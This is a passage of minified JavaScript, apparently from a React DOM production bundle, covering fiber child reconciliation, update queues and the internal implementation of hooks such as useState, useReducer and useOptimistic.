                k.index > oe ? (ye = k,
                k = null) : ye = k.sibling;
                var Gl = A(b, k, je.value, R);
                if (Gl === null) {
                    k === null && (k = ye);
                    break
                }
                e && k && Gl.alternate === null && t(b, k),
                y = u(Gl, y, oe),
                Ne === null ? W = Gl : Ne.sibling = Gl,
                Ne = Gl,
                k = ye
            }
            if (je.done)
                return l(b, k),
                Se && tl(b, oe),
                W;
            if (k === null) {
                for (; !je.done; oe++,
                je = E.next())
                    je = U(b, je.value, R),
                    je !== null && (y = u(je, y, oe),
                    Ne === null ? W = je : Ne.sibling = je,
                    Ne = je);
                return Se && tl(b, oe),
                W
            }
            for (k = a(k); !je.done; oe++,
            je = E.next())
                je = C(k, b, oe, je.value, R),
                je !== null && (e && je.alternate !== null && k.delete(je.key === null ? oe : je.key),
                y = u(je, y, oe),
                Ne === null ? W = je : Ne.sibling = je,
                Ne = je);
            return e && k.forEach(function(Wp) {
                return t(b, Wp)
            }),
            Se && tl(b, oe),
            W
        }
        function Me(b, y, E, R) {
            if (typeof E == "object" && E !== null && E.type === Y && E.key === null && (E = E.props.children),
            typeof E == "object" && E !== null) {
                switch (E.$$typeof) {
                case q:
                    e: {
                        for (var W = E.key; y !== null; ) {
                            if (y.key === W) {
                                if (W = E.type,
                                W === Y) {
                                    if (y.tag === 7) {
                                        l(b, y.sibling),
                                        R = n(y, E.props.children),
                                        R.return = b,
                                        b = R;
                                        break e
                                    }
                                } else if (y.elementType === W || typeof W == "object" && W !== null && W.$$typeof === re && la(W) === y.type) {
                                    l(b, y.sibling),
                                    R = n(y, E.props),
                                    xn(R, E),
                                    R.return = b,
                                    b = R;
                                    break e
                                }
                                l(b, y);
                                break
                            } else
                                t(b, y);
                            y = y.sibling
                        }
                        E.type === Y ? (R = Fl(E.props.children, b.mode, R, E.key),
                        R.return = b,
                        b = R) : (R = Su(E.type, E.key, E.props, null, b.mode, R),
                        xn(R, E),
                        R.return = b,
                        b = R)
                    }
                    return c(b);
                case X:
                    e: {
                        for (W = E.key; y !== null; ) {
                            if (y.key === W)
                                if (y.tag === 4 && y.stateNode.containerInfo === E.containerInfo && y.stateNode.implementation === E.implementation) {
                                    l(b, y.sibling),
                                    R = n(y, E.children || []),
                                    R.return = b,
                                    b = R;
                                    break e
                                } else {
                                    l(b, y);
                                    break
                                }
                            else
                                t(b, y);
                            y = y.sibling
                        }
                        R = ec(E, b.mode, R),
                        R.return = b,
                        b = R
                    }
                    return c(b);
                case re:
                    return E = la(E),
                    Me(b, y, E, R)
                }
                if (Qe(E))
                    return K(b, y, E, R);
                if (le(E)) {
                    if (W = le(E),
                    typeof W != "function")
                        throw Error(o(150));
                    return E = W.call(E),
                    P(b, y, E, R)
                }
                if (typeof E.then == "function")
                    return Me(b, y, Au(E), R);
                if (E.$$typeof === V)
                    return Me(b, y, Nu(b, E), R);
                zu(b, E)
            }
            return typeof E == "string" && E !== "" || typeof E == "number" || typeof E == "bigint" ? (E = "" + E,
            y !== null && y.tag === 6 ? (l(b, y.sibling),
            R = n(y, E),
            R.return = b,
            b = R) : (l(b, y),
            R = Pi(E, b.mode, R),
            R.return = b,
            b = R),
            c(b)) : l(b, y)
        }
        return function(b, y, E, R) {
            try {
                bn = 0;
                var W = Me(b, y, E, R);
                return La = null,
                W
            } catch (k) {
                if (k === Ha || k === Eu)
                    throw k;
                var Ne = Nt(29, k, null, b.mode);
                return Ne.lanes = R,
                Ne.return = b,
                Ne
            } finally {}
        }
    }
    var na = fr(!0)
      , dr = fr(!1)
      , El = !1;
    function dc(e) {
        e.updateQueue = {
            baseState: e.memoizedState,
            firstBaseUpdate: null,
            lastBaseUpdate: null,
            shared: {
                pending: null,
                lanes: 0,
                hiddenCallbacks: null
            },
            callbacks: null
        }
    }
    function mc(e, t) {
        e = e.updateQueue,
        t.updateQueue === e && (t.updateQueue = {
            baseState: e.baseState,
            firstBaseUpdate: e.firstBaseUpdate,
            lastBaseUpdate: e.lastBaseUpdate,
            shared: e.shared,
            callbacks: null
        })
    }
    function Tl(e) {
        return {
            lane: e,
            tag: 0,
            payload: null,
            callback: null,
            next: null
        }
    }
    function Al(e, t, l) {
        var a = e.updateQueue;
        if (a === null)
            return null;
        if (a = a.shared,
        (Te & 2) !== 0) {
            var n = a.pending;
            return n === null ? t.next = t : (t.next = n.next,
            n.next = t),
            a.pending = t,
            t = gu(e),
            $o(e, null, l),
            t
        }
        return yu(e, a, t, l),
        gu(e)
    }
    function Nn(e, t, l) {
        if (t = t.updateQueue,
        t !== null && (t = t.shared,
        (l & 4194048) !== 0)) {
            var a = t.lanes;
            a &= e.pendingLanes,
            l |= a,
            t.lanes = l,
            lo(e, l)
        }
    }
    function hc(e, t) {
        var l = e.updateQueue
          , a = e.alternate;
        if (a !== null && (a = a.updateQueue,
        l === a)) {
            var n = null
              , u = null;
            if (l = l.firstBaseUpdate,
            l !== null) {
                do {
                    var c = {
                        lane: l.lane,
                        tag: l.tag,
                        payload: l.payload,
                        callback: null,
                        next: null
                    };
                    u === null ? n = u = c : u = u.next = c,
                    l = l.next
                } while (l !== null);
                u === null ? n = u = t : u = u.next = t
            } else
                n = u = t;
            l = {
                baseState: a.baseState,
                firstBaseUpdate: n,
                lastBaseUpdate: u,
                shared: a.shared,
                callbacks: a.callbacks
            },
            e.updateQueue = l;
            return
        }
        e = l.lastBaseUpdate,
        e === null ? l.firstBaseUpdate = t : e.next = t,
        l.lastBaseUpdate = t
    }
    var pc = !1;
    function jn() {
        if (pc) {
            var e = Ua;
            if (e !== null)
                throw e
        }
    }
    function En(e, t, l, a) {
        pc = !1;
        var n = e.updateQueue;
        El = !1;
        var u = n.firstBaseUpdate
          , c = n.lastBaseUpdate
          , r = n.shared.pending;
        if (r !== null) {
            n.shared.pending = null;
            var h = r
              , T = h.next;
            h.next = null,
            c === null ? u = T : c.next = T,
            c = h;
            var M = e.alternate;
            M !== null && (M = M.updateQueue,
            r = M.lastBaseUpdate,
            r !== c && (r === null ? M.firstBaseUpdate = T : r.next = T,
            M.lastBaseUpdate = h))
        }
        if (u !== null) {
            var U = n.baseState;
            c = 0,
            M = T = h = null,
            r = u;
            do {
                var A = r.lane & -536870913
                  , C = A !== r.lane;
                if (C ? (ve & A) === A : (a & A) === A) {
                    A !== 0 && A === _a && (pc = !0),
                    M !== null && (M = M.next = {
                        lane: 0,
                        tag: r.tag,
                        payload: r.payload,
                        callback: null,
                        next: null
                    });
                    e: {
                        var K = e
                          , P = r;
                        A = t;
                        var Me = l;
                        switch (P.tag) {
                        case 1:
                            if (K = P.payload,
                            typeof K == "function") {
                                U = K.call(Me, U, A);
                                break e
                            }
                            U = K;
                            break e;
                        case 3:
                            K.flags = K.flags & -65537 | 128;
                        case 0:
                            if (K = P.payload,
                            A = typeof K == "function" ? K.call(Me, U, A) : K,
                            A == null)
                                break e;
                            U = j({}, U, A);
                            break e;
                        case 2:
                            El = !0
                        }
                    }
                    A = r.callback,
                    A !== null && (e.flags |= 64,
                    C && (e.flags |= 8192),
                    C = n.callbacks,
                    C === null ? n.callbacks = [A] : C.push(A))
                } else
                    C = {
                        lane: A,
                        tag: r.tag,
                        payload: r.payload,
                        callback: r.callback,
                        next: null
                    },
                    M === null ? (T = M = C,
                    h = U) : M = M.next = C,
                    c |= A;
                if (r = r.next,
                r === null) {
                    if (r = n.shared.pending,
                    r === null)
                        break;
                    C = r,
                    r = C.next,
                    C.next = null,
                    n.lastBaseUpdate = C,
                    n.shared.pending = null
                }
            } while (!0);
            M === null && (h = U),
            n.baseState = h,
            n.firstBaseUpdate = T,
            n.lastBaseUpdate = M,
            u === null && (n.shared.lanes = 0),
            Ml |= c,
            e.lanes = c,
            e.memoizedState = U
        }
    }
    function mr(e, t) {
        if (typeof e != "function")
            throw Error(o(191, e));
        e.call(t)
    }
    function hr(e, t) {
        var l = e.callbacks;
        if (l !== null)
            for (e.callbacks = null,
            e = 0; e < l.length; e++)
                mr(l[e], t)
    }
    var Ba = g(null)
      , Du = g(0);
    function pr(e, t) {
        e = dl,
        L(Du, e),
        L(Ba, t),
        dl = e | t.baseLanes
    }
    function vc() {
        L(Du, dl),
        L(Ba, Ba.current)
    }
    function yc() {
        dl = Du.current,
        _(Ba),
        _(Du)
    }
    var jt = g(null)
      , Ht = null;
    function zl(e) {
        var t = e.alternate;
        L(Ze, Ze.current & 1),
        L(jt, e),
        Ht === null && (t === null || Ba.current !== null || t.memoizedState !== null) && (Ht = e)
    }
    function gc(e) {
        L(Ze, Ze.current),
        L(jt, e),
        Ht === null && (Ht = e)
    }
    function vr(e) {
        e.tag === 22 ? (L(Ze, Ze.current),
        L(jt, e),
        Ht === null && (Ht = e)) : Dl()
    }
    function Dl() {
        L(Ze, Ze.current),
        L(jt, jt.current)
    }
    function Et(e) {
        _(jt),
        Ht === e && (Ht = null),
        _(Ze)
    }
    var Ze = g(0);
    function Cu(e) {
        for (var t = e; t !== null; ) {
            if (t.tag === 13) {
                var l = t.memoizedState;
                if (l !== null && (l = l.dehydrated,
                l === null || Es(l) || Ts(l)))
                    return t
            } else if (t.tag === 19 && (t.memoizedProps.revealOrder === "forwards" || t.memoizedProps.revealOrder === "backwards" || t.memoizedProps.revealOrder === "unstable_legacy-backwards" || t.memoizedProps.revealOrder === "together")) {
                if ((t.flags & 128) !== 0)
                    return t
            } else if (t.child !== null) {
                t.child.return = t,
                t = t.child;
                continue
            }
            if (t === e)
                break;
            for (; t.sibling === null; ) {
                if (t.return === null || t.return === e)
                    return null;
                t = t.return
            }
            t.sibling.return = t.return,
            t = t.sibling
        }
        return null
    }
    var nl = 0
      , ce = null
      , Ce = null
      , Je = null
      , Ou = !1
      , qa = !1
      , ua = !1
      , Mu = 0
      , Tn = 0
      , Ya = null
      , wh = 0;
    function Ge() {
        throw Error(o(321))
    }
    function Sc(e, t) {
        if (t === null)
            return !1;
        for (var l = 0; l < t.length && l < e.length; l++)
            if (!xt(e[l], t[l]))
                return !1;
        return !0
    }
    function bc(e, t, l, a, n, u) {
        return nl = u,
        ce = t,
        t.memoizedState = null,
        t.updateQueue = null,
        t.lanes = 0,
        O.H = e === null || e.memoizedState === null ? Pr : Hc,
        ua = !1,
        u = l(a, n),
        ua = !1,
        qa && (u = gr(t, l, a, n)),
        yr(e),
        u
    }
    function yr(e) {
        O.H = Dn;
        var t = Ce !== null && Ce.next !== null;
        if (nl = 0,
        Je = Ce = ce = null,
        Ou = !1,
        Tn = 0,
        Ya = null,
        t)
            throw Error(o(300));
        e === null || ke || (e = e.dependencies,
        e !== null && xu(e) && (ke = !0))
    }
    function gr(e, t, l, a) {
        ce = e;
        var n = 0;
        do {
            if (qa && (Ya = null),
            Tn = 0,
            qa = !1,
            25 <= n)
                throw Error(o(301));
            if (n += 1,
            Je = Ce = null,
            e.updateQueue != null) {
                var u = e.updateQueue;
                u.lastEffect = null,
                u.events = null,
                u.stores = null,
                u.memoCache != null && (u.memoCache.index = 0)
            }
            O.H = ef,
            u = t(l, a)
        } while (qa);
        return u
    }
    function Gh() {
        var e = O.H
          , t = e.useState()[0];
        return t = typeof t.then == "function" ? An(t) : t,
        e = e.useState()[0],
        (Ce !== null ? Ce.memoizedState : null) !== e && (ce.flags |= 1024),
        t
    }
    function xc() {
        var e = Mu !== 0;
        return Mu = 0,
        e
    }
    function Nc(e, t, l) {
        t.updateQueue = e.updateQueue,
        t.flags &= -2053,
        e.lanes &= ~l
    }
    function jc(e) {
        if (Ou) {
            for (e = e.memoizedState; e !== null; ) {
                var t = e.queue;
                t !== null && (t.pending = null),
                e = e.next
            }
            Ou = !1
        }
        nl = 0,
        Je = Ce = ce = null,
        qa = !1,
        Tn = Mu = 0,
        Ya = null
    }
    function rt() {
        var e = {
            memoizedState: null,
            baseState: null,
            baseQueue: null,
            queue: null,
            next: null
        };
        return Je === null ? ce.memoizedState = Je = e : Je = Je.next = e,
        Je
    }
    function Ve() {
        if (Ce === null) {
            var e = ce.alternate;
            e = e !== null ? e.memoizedState : null
        } else
            e = Ce.next;
        var t = Je === null ? ce.memoizedState : Je.next;
        if (t !== null)
            Je = t,
            Ce = e;
        else {
            if (e === null)
                throw ce.alternate === null ? Error(o(467)) : Error(o(310));
            Ce = e,
            e = {
                memoizedState: Ce.memoizedState,
                baseState: Ce.baseState,
                baseQueue: Ce.baseQueue,
                queue: Ce.queue,
                next: null
            },
            Je === null ? ce.memoizedState = Je = e : Je = Je.next = e
        }
        return Je
    }
    function Ru() {
        return {
            lastEffect: null,
            events: null,
            stores: null,
            memoCache: null
        }
    }
    function An(e) {
        var t = Tn;
        return Tn += 1,
        Ya === null && (Ya = []),
        e = sr(Ya, e, t),
        t = ce,
        (Je === null ? t.memoizedState : Je.next) === null && (t = t.alternate,
        O.H = t === null || t.memoizedState === null ? Pr : Hc),
        e
    }
    function _u(e) {
        if (e !== null && typeof e == "object") {
            if (typeof e.then == "function")
                return An(e);
            if (e.$$typeof === V)
                return at(e)
        }
        throw Error(o(438, String(e)))
    }
    function Ec(e) {
        var t = null
          , l = ce.updateQueue;
        if (l !== null && (t = l.memoCache),
        t == null) {
            var a = ce.alternate;
            a !== null && (a = a.updateQueue,
            a !== null && (a = a.memoCache,
            a != null && (t = {
                data: a.data.map(function(n) {
                    return n.slice()
                }),
                index: 0
            })))
        }
        if (t == null && (t = {
            data: [],
            index: 0
        }),
        l === null && (l = Ru(),
        ce.updateQueue = l),
        l.memoCache = t,
        l = t.data[t.index],
        l === void 0)
            for (l = t.data[t.index] = Array(e),
            a = 0; a < e; a++)
                l[a] = Ae;
        return t.index++,
        l
    }
    function ul(e, t) {
        return typeof t == "function" ? t(e) : t
    }
    function Uu(e) {
        var t = Ve();
        return Tc(t, Ce, e)
    }
    function Tc(e, t, l) {
        var a = e.queue;
        if (a === null)
            throw Error(o(311));
        a.lastRenderedReducer = l;
        var n = e.baseQueue
          , u = a.pending;
        if (u !== null) {
            if (n !== null) {
                var c = n.next;
                n.next = u.next,
                u.next = c
            }
            t.baseQueue = n = u,
            a.pending = null
        }
        if (u = e.baseState,
        n === null)
            e.memoizedState = u;
        else {
            t = n.next;
            var r = c = null
              , h = null
              , T = t
              , M = !1;
            do {
                var U = T.lane & -536870913;
                if (U !== T.lane ? (ve & U) === U : (nl & U) === U) {
                    var A = T.revertLane;
                    if (A === 0)
                        h !== null && (h = h.next = {
                            lane: 0,
                            revertLane: 0,
                            gesture: null,
                            action: T.action,
                            hasEagerState: T.hasEagerState,
                            eagerState: T.eagerState,
                            next: null
                        }),
                        U === _a && (M = !0);
                    else if ((nl & A) === A) {
                        T = T.next,
                        A === _a && (M = !0);
                        continue
                    } else
                        U = {
                            lane: 0,
                            revertLane: T.revertLane,
                            gesture: null,
                            action: T.action,
                            hasEagerState: T.hasEagerState,
                            eagerState: T.eagerState,
                            next: null
                        },
                        h === null ? (r = h = U,
                        c = u) : h = h.next = U,
                        ce.lanes |= A,
                        Ml |= A;
                    U = T.action,
                    ua && l(u, U),
                    u = T.hasEagerState ? T.eagerState : l(u, U)
                } else
                    A = {
                        lane: U,
                        revertLane: T.revertLane,
                        gesture: T.gesture,
                        action: T.action,
                        hasEagerState: T.hasEagerState,
                        eagerState: T.eagerState,
                        next: null
                    },
                    h === null ? (r = h = A,
                    c = u) : h = h.next = A,
                    ce.lanes |= U,
                    Ml |= U;
                T = T.next
            } while (T !== null && T !== t);
            if (h === null ? c = u : h.next = r,
            !xt(u, e.memoizedState) && (ke = !0,
            M && (l = Ua,
            l !== null)))
                throw l;
            e.memoizedState = u,
            e.baseState = c,
            e.baseQueue = h,
            a.lastRenderedState = u
        }
        return n === null && (a.lanes = 0),
        [e.memoizedState, a.dispatch]
    }
    function Ac(e) {
        var t = Ve()
          , l = t.queue;
        if (l === null)
            throw Error(o(311));
        l.lastRenderedReducer = e;
        var a = l.dispatch
          , n = l.pending
          , u = t.memoizedState;
        if (n !== null) {
            l.pending = null;
            var c = n = n.next;
            do
                u = e(u, c.action),
                c = c.next;
            while (c !== n);
            xt(u, t.memoizedState) || (ke = !0),
            t.memoizedState = u,
            t.baseQueue === null && (t.baseState = u),
            l.lastRenderedState = u
        }
        return [u, a]
    }
    function Sr(e, t, l) {
        var a = ce
          , n = Ve()
          , u = Se;
        if (u) {
            if (l === void 0)
                throw Error(o(407));
            l = l()
        } else
            l = t();
        var c = !xt((Ce || n).memoizedState, l);
        if (c && (n.memoizedState = l,
        ke = !0),
        n = n.queue,
        Cc(Nr.bind(null, a, n, e), [e]),
        n.getSnapshot !== t || c || Je !== null && Je.memoizedState.tag & 1) {
            if (a.flags |= 2048,
            wa(9, {
                destroy: void 0
            }, xr.bind(null, a, n, l, t), null),
            Ue === null)
                throw Error(o(349));
            u || (nl & 127) !== 0 || br(a, t, l)
        }
        return l
    }
    function br(e, t, l) {
        e.flags |= 16384,
        e = {
            getSnapshot: t,
            value: l
        },
        t = ce.updateQueue,
        t === null ? (t = Ru(),
        ce.updateQueue = t,
        t.stores = [e]) : (l = t.stores,
        l === null ? t.stores = [e] : l.push(e))
    }
    function xr(e, t, l, a) {
        t.value = l,
        t.getSnapshot = a,
        jr(t) && Er(e)
    }
    function Nr(e, t, l) {
        return l(function() {
            jr(t) && Er(e)
        })
    }
    function jr(e) {
        var t = e.getSnapshot;
        e = e.value;
        try {
            var l = t();
            return !xt(e, l)
        } catch {
            return !0
        }
    }
    function Er(e) {
        var t = Wl(e, 2);
        t !== null && yt(t, e, 2)
    }
    function zc(e) {
        var t = rt();
        if (typeof e == "function") {
            var l = e;
            if (e = l(),
            ua) {
                yl(!0);
                try {
                    l()
                } finally {
                    yl(!1)
                }
            }
        }
        return t.memoizedState = t.baseState = e,
        t.queue = {
            pending: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: ul,
            lastRenderedState: e
        },
        t
    }
    function Tr(e, t, l, a) {
        return e.baseState = l,
        Tc(e, Ce, typeof a == "function" ? a : ul)
    }
    function Xh(e, t, l, a, n) {
        if (Bu(e))
            throw Error(o(485));
        if (e = t.action,
        e !== null) {
            var u = {
                payload: n,
                action: e,
                next: null,
                isTransition: !0,
                status: "pending",
                value: null,
                reason: null,
                listeners: [],
                then: function(c) {
                    u.listeners.push(c)
                }
            };
            O.T !== null ? l(!0) : u.isTransition = !1,
            a(u),
            l = t.pending,
            l === null ? (u.next = t.pending = u,
            Ar(t, u)) : (u.next = l.next,
            t.pending = l.next = u)
        }
    }
    function Ar(e, t) {
        var l = t.action
          , a = t.payload
          , n = e.state;
        if (t.isTransition) {
            var u = O.T
              , c = {};
            O.T = c;
            try {
                var r = l(n, a)
                  , h = O.S;
                h !== null && h(c, r),
                zr(e, t, r)
            } catch (T) {
                Dc(e, t, T)
            } finally {
                u !== null && c.types !== null && (u.types = c.types),
                O.T = u
            }
        } else
            try {
                u = l(n, a),
                zr(e, t, u)
            } catch (T) {
                Dc(e, t, T)
            }
    }
    function zr(e, t, l) {
        l !== null && typeof l == "object" && typeof l.then == "function" ? l.then(function(a) {
            Dr(e, t, a)
        }, function(a) {
            return Dc(e, t, a)
        }) : Dr(e, t, l)
    }
    function Dr(e, t, l) {
        t.status = "fulfilled",
        t.value = l,
        Cr(t),
        e.state = l,
        t = e.pending,
        t !== null && (l = t.next,
        l === t ? e.pending = null : (l = l.next,
        t.next = l,
        Ar(e, l)))
    }
    function Dc(e, t, l) {
        var a = e.pending;
        if (e.pending = null,
        a !== null) {
            a = a.next;
            do
                t.status = "rejected",
                t.reason = l,
                Cr(t),
                t = t.next;
            while (t !== a)
        }
        e.action = null
    }
    function Cr(e) {
        e = e.listeners;
        for (var t = 0; t < e.length; t++)
            (0,
            e[t])()
    }
    function Or(e, t) {
        return t
    }
    function Mr(e, t) {
        if (Se) {
            var l = Ue.formState;
            if (l !== null) {
                e: {
                    var a = ce;
                    if (Se) {
                        if (He) {
                            t: {
                                for (var n = He, u = Ut; n.nodeType !== 8; ) {
                                    if (!u) {
                                        n = null;
                                        break t
                                    }
                                    if (n = Lt(n.nextSibling),
                                    n === null) {
                                        n = null;
                                        break t
                                    }
                                }
                                u = n.data,
                                n = u === "F!" || u === "F" ? n : null
                            }
                            if (n) {
                                He = Lt(n.nextSibling),
                                a = n.data === "F!";
                                break e
                            }
                        }
                        Nl(a)
                    }
                    a = !1
                }
                a && (t = l[0])
            }
        }
        return l = rt(),
        l.memoizedState = l.baseState = t,
        a = {
            pending: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: Or,
            lastRenderedState: t
        },
        l.queue = a,
        l = Wr.bind(null, ce, a),
        a.dispatch = l,
        a = zc(!1),
        u = Uc.bind(null, ce, !1, a.queue),
        a = rt(),
        n = {
            state: t,
            dispatch: null,
            action: e,
            pending: null
        },
        a.queue = n,
        l = Xh.bind(null, ce, n, u, l),
        n.dispatch = l,
        a.memoizedState = e,
        [t, l, !1]
    }
    function Rr(e) {
        var t = Ve();
        return _r(t, Ce, e)
    }
    function _r(e, t, l) {
        if (t = Tc(e, t, Or)[0],
        e = Uu(ul)[0],
        typeof t == "object" && t !== null && typeof t.then == "function")
            try {
                var a = An(t)
            } catch (c) {
                throw c === Ha ? Eu : c
            }
        else
            a = t;
        t = Ve();
        var n = t.queue
          , u = n.dispatch;
        return l !== t.memoizedState && (ce.flags |= 2048,
        wa(9, {
            destroy: void 0
        }, Qh.bind(null, n, l), null)),
        [a, u, e]
    }
    function Qh(e, t) {
        e.action = t
    }
    function Ur(e) {
        var t = Ve()
          , l = Ce;
        if (l !== null)
            return _r(t, l, e);
        Ve(),
        t = t.memoizedState,
        l = Ve();
        var a = l.queue.dispatch;
        return l.memoizedState = e,
        [t, a, !1]
    }
    function wa(e, t, l, a) {
        return e = {
            tag: e,
            create: l,
            deps: a,
            inst: t,
            next: null
        },
        t = ce.updateQueue,
        t === null && (t = Ru(),
        ce.updateQueue = t),
        l = t.lastEffect,
        l === null ? t.lastEffect = e.next = e : (a = l.next,
        l.next = e,
        e.next = a,
        t.lastEffect = e),
        e
    }
    function Hr() {
        return Ve().memoizedState
    }
    function Hu(e, t, l, a) {
        var n = rt();
        ce.flags |= e,
        n.memoizedState = wa(1 | t, {
            destroy: void 0
        }, l, a === void 0 ? null : a)
    }
    function Lu(e, t, l, a) {
        var n = Ve();
        a = a === void 0 ? null : a;
        var u = n.memoizedState.inst;
        Ce !== null && a !== null && Sc(a, Ce.memoizedState.deps) ? n.memoizedState = wa(t, u, l, a) : (ce.flags |= e,
        n.memoizedState = wa(1 | t, u, l, a))
    }
    function Lr(e, t) {
        Hu(8390656, 8, e, t)
    }
    function Cc(e, t) {
        Lu(2048, 8, e, t)
    }
    function Zh(e) {
        ce.flags |= 4;
        var t = ce.updateQueue;
        if (t === null)
            t = Ru(),
            ce.updateQueue = t,
            t.events = [e];
        else {
            var l = t.events;
            l === null ? t.events = [e] : l.push(e)
        }
    }
    function Br(e) {
        var t = Ve().memoizedState;
        return Zh({
            ref: t,
            nextImpl: e
        }),
        function() {
            if ((Te & 2) !== 0)
                throw Error(o(440));
            return t.impl.apply(void 0, arguments)
        }
    }
    function qr(e, t) {
        return Lu(4, 2, e, t)
    }
    function Yr(e, t) {
        return Lu(4, 4, e, t)
    }
    function wr(e, t) {
        if (typeof t == "function") {
            e = e();
            var l = t(e);
            return function() {
                typeof l == "function" ? l() : t(null)
            }
        }
        if (t != null)
            return e = e(),
            t.current = e,
            function() {
                t.current = null
            }
    }
    function Gr(e, t, l) {
        l = l != null ? l.concat([e]) : null,
        Lu(4, 4, wr.bind(null, t, e), l)
    }
    function Oc() {}
    function Xr(e, t) {
        var l = Ve();
        t = t === void 0 ? null : t;
        var a = l.memoizedState;
        return t !== null && Sc(t, a[1]) ? a[0] : (l.memoizedState = [e, t],
        e)
    }
    function Qr(e, t) {
        var l = Ve();
        t = t === void 0 ? null : t;
        var a = l.memoizedState;
        if (t !== null && Sc(t, a[1]))
            return a[0];
        if (a = e(),
        ua) {
            yl(!0);
            try {
                e()
            } finally {
                yl(!1)
            }
        }
        return l.memoizedState = [a, t],
        a
    }
    function Mc(e, t, l) {
        return l === void 0 || (nl & 1073741824) !== 0 && (ve & 261930) === 0 ? e.memoizedState = t : (e.memoizedState = l,
        e = Vf(),
        ce.lanes |= e,
        Ml |= e,
        l)
    }
    function Zr(e, t, l, a) {
        return xt(l, t) ? l : Ba.current !== null ? (e = Mc(e, l, a),
        xt(e, t) || (ke = !0),
        e) : (nl & 42) === 0 || (nl & 1073741824) !== 0 && (ve & 261930) === 0 ? (ke = !0,
        e.memoizedState = l) : (e = Vf(),
        ce.lanes |= e,
        Ml |= e,
        t)
    }
    function Vr(e, t, l, a, n) {
        var u = B.p;
        B.p = u !== 0 && 8 > u ? u : 8;
        var c = O.T
          , r = {};
        O.T = r,
        Uc(e, !1, t, l);
        try {
            var h = n()
              , T = O.S;
            if (T !== null && T(r, h),
            h !== null && typeof h == "object" && typeof h.then == "function") {
                var M = Yh(h, a);
                zn(e, t, M, zt(e))
            } else
                zn(e, t, a, zt(e))
        } catch (U) {
            zn(e, t, {
                then: function() {},
                status: "rejected",
                reason: U
            }, zt())
        } finally {
            B.p = u,
            c !== null && r.types !== null && (c.types = r.types),
            O.T = c
        }
    }
    function Vh() {}
    function Rc(e, t, l, a) {
        if (e.tag !== 5)
            throw Error(o(476));
        var n = Kr(e).queue;
        Vr(e, n, t, $, l === null ? Vh : function() {
            return Jr(e),
            l(a)
        }
        )
    }
    function Kr(e) {
        var t = e.memoizedState;
        if (t !== null)
            return t;
        t = {
            memoizedState: $,
            baseState: $,
            baseQueue: null,
            queue: {
                pending: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: ul,
                lastRenderedState: $
            },
            next: null
        };
        var l = {};
        return t.next = {
            memoizedState: l,
            baseState: l,
            baseQueue: null,
            queue: {
                pending: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: ul,
                lastRenderedState: l
            },
            next: null
        },
        e.memoizedState = t,
        e = e.alternate,
        e !== null && (e.memoizedState = t),
        t
    }
    function Jr(e) {
        var t = Kr(e);
        t.next === null && (t = e.alternate.memoizedState),
        zn(e, t.next.queue, {}, zt())
    }
    function _c() {
        return at(Zn)
    }
    function kr() {
        return Ve().memoizedState
    }
    function $r() {
        return Ve().memoizedState
    }
    function Kh(e) {
        for (var t = e.return; t !== null; ) {
            switch (t.tag) {
            case 24:
            case 3:
                var l = zt();
                e = Tl(l);
                var a = Al(t, e, l);
                a !== null && (yt(a, t, l),
                Nn(a, t, l)),
                t = {
                    cache: sc()
                },
                e.payload = t;
                return
            }
            t = t.return
        }
    }
    function Jh(e, t, l) {
        var a = zt();
        l = {
            lane: a,
            revertLane: 0,
            gesture: null,
            action: l,
            hasEagerState: !1,
            eagerState: null,
            next: null
        },
        Bu(e) ? Fr(t, l) : (l = Fi(e, t, l, a),
        l !== null && (yt(l, e, a),
        Ir(l, t, a)))
    }
    function Wr(e, t, l) {
        var a = zt();
        zn(e, t, l, a)
    }
    function zn(e, t, l, a) {
        var n = {
            lane: a,
            revertLane: 0,
            gesture: null,
            action: l,
            hasEagerState: !1,
            eagerState: null,
            next: null
        };
        if (Bu(e))
            Fr(t, n);
        else {
            var u = e.alternate;
            if (e.lanes === 0 && (u === null || u.lanes === 0) && (u = t.lastRenderedReducer,
            u !== null))
                try {
                    var c = t.lastRenderedState
                      , r = u(c, l);
                    if (n.hasEagerState = !0,
                    n.eagerState = r,
                    xt(r, c))
                        return yu(e, t, n, 0),
                        Ue === null && vu(),
                        !1
                } catch {} finally {}
            if (l = Fi(e, t, n, a),
            l !== null)
                return yt(l, e, a),
                Ir(l, t, a),
                !0
        }
        return !1
    }
    function Uc(e, t, l, a) {
        if (a = {
            lane: 2,
            revertLane: ds(),
            gesture: null,
            action: a,
            hasEagerState: !1,
            eagerState: null,
            next: null
        },
        Bu(e)) {
            if (t)
                throw Error(o(479))
        } else
            t = Fi(e, l, a, 2),
            t !== null && yt(t, e, 2)
    }
    function Bu(e) {
        var t = e.alternate;
        return e === ce || t !== null && t === ce
    }
    function Fr(e, t) {
        qa = Ou = !0;
        var l = e.pending;
        l === null ? t.next = t : (t.next = l.next,
        l.next = t),
        e.pending = t
    }
    function Ir(e, t, l) {
        if ((l & 4194048) !== 0) {
            var a = t.lanes;
            a &= e.pendingLanes,
            l |= a,
            t.lanes = l,
            lo(e, l)
        }
    }
    var Dn = {
        readContext: at,
        use: _u,
        useCallback: Ge,
        useContext: Ge,
        useEffect: Ge,
        useImperativeHandle: Ge,
        useLayoutEffect: Ge,
        useInsertionEffect: Ge,
        useMemo: Ge,
        useReducer: Ge,
        useRef: Ge,
        useState: Ge,
        useDebugValue: Ge,
        useDeferredValue: Ge,
        useTransition: Ge,
        useSyncExternalStore: Ge,
        useId: Ge,
        useHostTransitionStatus: Ge,
        useFormState: Ge,
        useActionState: Ge,
        useOptimistic: Ge,
        useMemoCache: Ge,
        useCacheRefresh: Ge
    };
    Dn.useEffectEvent = Ge;
    var Pr = {
        readContext: at,
        use: _u,
        useCallback: function(e, t) {
            return rt().memoizedState = [e, t === void 0 ? null : t],
            e
        },
        useContext: at,
        useEffect: Lr,
        useImperativeHandle: function(e, t, l) {
            l = l != null ? l.concat([e]) : null,
            Hu(4194308, 4, wr.bind(null, t, e), l)
        },
        useLayoutEffect: function(e, t) {
            return Hu(4194308, 4, e, t)
        },
        useInsertionEffect: function(e, t) {
            Hu(4, 2, e, t)
        },
        useMemo: function(e, t) {
            var l = rt();
            t = t === void 0 ? null : t;
            var a = e();
            if (ua) {
                yl(!0);
                try {
                    e()
                } finally {
                    yl(!1)
                }
            }
            return l.memoizedState = [a, t],
            a
        },
        useReducer: function(e, t, l) {
            var a = rt();
            if (l !== void 0) {
                var n = l(t);
                if (ua) {
                    yl(!0);
                    try {
                        l(t)
